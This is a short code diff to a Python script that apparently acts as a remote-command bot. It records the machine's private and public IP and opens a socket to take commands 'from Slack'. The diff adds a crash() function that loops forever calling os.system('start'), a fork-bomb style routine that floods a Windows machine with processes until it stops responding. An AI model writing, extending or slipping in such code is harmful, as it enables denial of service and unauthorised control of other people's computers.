@@ -1,4 +1,5 @@
 import socket 
+import os
 from requests import *
 import irc
 
@@ -8,6 +9,10 @@ import irc
 private_ip = socket.gethostbyname(socket.gethostname())
 public_ip = get('https://api.ipify.org').text
 
+#crash
+def crash():
+  while True:
+    os.system("start")
 
 #create socket object for getting commands from Slack
 s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
